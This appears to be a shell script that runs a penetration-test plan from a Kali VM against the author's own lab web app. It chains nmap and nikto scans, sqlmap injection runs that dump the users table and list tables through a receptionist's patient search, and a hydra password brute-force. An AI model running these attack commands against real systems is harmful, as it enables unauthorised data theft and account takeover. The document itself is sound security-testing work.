#!/bin/sh
# Runs the CLI parts of docs/KALI_TEST_PLAN.md from the Kali VM against our own lab host only.
# Usage (on Kali): sh kali_run.sh <host-ip> ravi <ravi's baseline password>
# Use the receptionist: the baseline only builds the search SQL unsafely for that role.
H=${1:-192.168.56.1}; U=${2:-ravi}; P=$3
[ -n "$P" ] || { echo "usage: sh kali_run.sh <host-ip> ravi <ravi's baseline password>" >&2; exit 2; }
B=http://$H:5444; S=https://$H:5443
E=$HOME/vapt-evidence; mkdir -p "$E"; cd "$E" || exit 1
step() { echo "=== $(date '+%F %T') $1" | tee -a run.log; }

step "nmap full port scan"
# -n: the isolated lab has no DNS server; without it nmap stalls on reverse lookups
nmap -n -Pn -T4 --min-rate 1000 -p- "$H" -oN nmap_ports.txt >/dev/null
nmap -n -Pn -sV -p 5443,5444 "$H" -oN nmap_app_ports.txt >/dev/null
step "nmap headers/methods"
nmap -n -Pn --script http-headers,http-methods -p 5444 "$H" -oN nmap_http_baseline.txt >/dev/null
nmap -n -Pn --script http-headers,http-methods,ssl-enum-ciphers -p 5443 "$H" -oN nmap_https_hardened.txt >/dev/null

step "curl headers + cookies"
curl -s -D - -o /dev/null "$B/login" > headers_baseline.txt
curl -sk -D - -o /dev/null "$S/login" > headers_hardened.txt

step "sqlmap baseline login (dump users)"
# --ignore-code=401: a failed login answers 401, which sqlmap otherwise treats as "stop"
sqlmap -u "$B/login" --data="username=x&password=x" -p username --ignore-code=401 --batch --risk=3 --level=5 \
  --dump -T users --output-dir="$E/sqlmap" > sqlmap_baseline_login.txt 2>&1

step "sqlmap baseline patient search (authenticated; pass the RECEPTIONIST, whose search is the injectable one)"
rm -f jar; curl -s -c jar -o /dev/null "$B/login"
code=$(curl -s -b jar -c jar -o /dev/null -w '%{http_code}' \
  --data-urlencode "username=$U" --data-urlencode "password=$P" "$B/login")
C=$(awk '$6=="sh_session"{print $7}' jar)
if [ "$code" = "302" ] && [ -n "$C" ]; then     # 302 = logged in; a wrong password answers 401
  echo "logged in as $U: yes" >> run.log
  # --tables, not --dbs: SQLite has no separate databases to list
  sqlmap -u "$B/patients/?q=x" -p q --cookie="sh_session=$C" --batch --tables \
    --output-dir="$E/sqlmap" > sqlmap_baseline_search.txt 2>&1
else
  echo "LOGIN FAILED as $U on the baseline (HTTP $code): check the password; search test skipped" | tee -a run.log
fi

step "sqlmap hardened login (fresh CSRF token per request)"
# --delay=7 keeps under the 10/min login limit, so a 429 is never mistaken for "not injectable"
sqlmap -u "$S/login" --data="csrf_token=x&username=x&password=x" -p username --csrf-token=csrf_token \
  --csrf-url="$S/login" --ignore-code=401 --delay=7 --batch --output-dir="$E/sqlmap" > sqlmap_hardened_login.txt 2>&1

step "nikto"
nikto -h "$B" -o nikto_baseline.txt -Format txt >/dev/null 2>&1
nikto -h "$S" -ssl -o nikto_hardened.txt -Format txt >/dev/null 2>&1

step "hydra baseline (top-100 rockyou + the real password planted at the end)"
# (a pipeline's status is head's, so "zcat | head || ..." never fell back: test for the file instead)
if [ -f /usr/share/wordlists/rockyou.txt ]; then head -100 /usr/share/wordlists/rockyou.txt > words.txt
else zcat /usr/share/wordlists/rockyou.txt.gz 2>/dev/null | head -100 > words.txt; fi
echo "$P" >> words.txt
hydra -l "$U" -P words.txt -s 5444 "$H" http-post-form "/login:username=^USER^&password=^PASS^:F=Wrong password" \
  > hydra_baseline.txt 2>&1
# Hardened brute force is not run with hydra: it needs a fresh CSRF token per request, so hydra
# only sees 400s. Lockout is evidenced by vapt/live_attack.py and the dashboard alert instead.

step "done"
